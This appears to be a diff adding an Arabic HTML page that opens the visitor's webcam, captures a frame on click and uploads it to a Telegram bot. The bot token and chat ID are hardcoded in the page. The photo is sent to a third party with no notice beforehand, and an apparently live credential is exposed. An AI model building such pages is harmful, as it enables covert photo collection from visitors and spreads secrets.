@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>التقاط صورة من الكاميرا</title>
+</head>
+<body>
+  <h1>التقاط صورة من الكاميرا</h1>
+  <video id="video" autoplay playsinline style="width: 100%; max-width: 600px;"></video>
+  <button id="capture">التقاط الصورة</button>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <img id="snapshot" alt="الصورة الملتقطة" style="display: block; margin-top: 20px; width: 100%; max-width: 600px;">
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const snapshot = document.getElementById('snapshot');
+    const captureButton = document.getElementById('capture');
+
+    const botToken = '7085032831:AAHpIvgwtiWAFDPOqqGnmg_l4RP57xGlQyY'; // ضع هنا رمز الوصول الخاص بالبوت
+    const chatId = '5198984934'; // ضع هنا معرف الدردشة (يمكن أن يكون معرف المستخدم أو المجموعة)
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (error) {
+        alert('حدث خطأ أثناء الوصول إلى الكاميرا: ' + error.message);
+      }
+    }
+
+    captureButton.addEventListener('click', async () => {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imageData = canvas.toDataURL('image/png');
+      snapshot.src = imageData;
+      snapshot.style.display = 'block';
+
+      // تحويل الصورة إلى Blob لإرسالها إلى تيليجرام
+      const blob = await (await fetch(imageData)).blob();
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'snapshot.png');
+
+      // إرسال الصورة إلى البوت
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('تم إرسال الصورة بنجاح إلى البوت!');
+        } else {
+          alert('حدث خطأ أثناء إرسال الصورة.');
+        }
+      })
+      .catch(error => {
+        alert('حدث خطأ: ' + error.message);
+      });
+    });
+
+    startCamera();
+  </script>
+</body>
+</html>
